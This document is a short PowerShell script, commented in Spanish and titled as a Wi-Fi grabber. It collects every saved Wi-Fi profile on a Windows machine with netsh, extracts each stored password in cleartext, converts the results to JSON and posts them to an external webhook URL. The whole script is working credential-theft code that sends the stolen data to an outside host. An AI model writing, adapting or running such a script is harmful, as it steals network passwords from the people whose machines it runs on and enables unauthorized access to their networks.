<#
  Wifi Grabber – Webhook para Windows en español
#>

# 1) Obtenemos todos los perfiles (plural)
$perfiles = netsh wlan show profiles `
  | Select-String 'Perfiles de usuario\s*:\s*(.+)$' `
  | ForEach-Object {
      $nombre = $_.Matches[0].Groups[1].Value.Trim()
      # Obtenemos detalles incluyendo la clave en claro
      $detalles = netsh wlan show profile name="$nombre" key=clear
      $claveLine = $detalles | Select-String 'Contenido de la clave\s*:\s*(.+)$'
      $clave     = if ($claveLine) { $claveLine.Matches[0].Groups[1].Value.Trim() } else { '' }
      [PSCustomObject]@{
        Profile  = $nombre
        Password = $clave
      }
    }

# 2) Convertimos a JSON
$json = $perfiles | ConvertTo-Json

# (debug) mostramos en pantalla el JSON
Write-Host "### JSON a enviar ###"
Write-Host $json

# 3) Enviamos al webhook
$webhook = 'https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64'
try {
    Invoke-RestMethod -Uri $webhook `
                      -Method Post `
                      -ContentType 'application/json' `
                      -Body $json
    Write-Host "✅ Datos enviados OK."
}
catch {
    Write-Error "❌ Error al enviar: $_"
}

# 4) Pausa para que veas la salida si lo ejecutas manualmente
Read-Host -Prompt 'Presiona ENTER para cerrar'
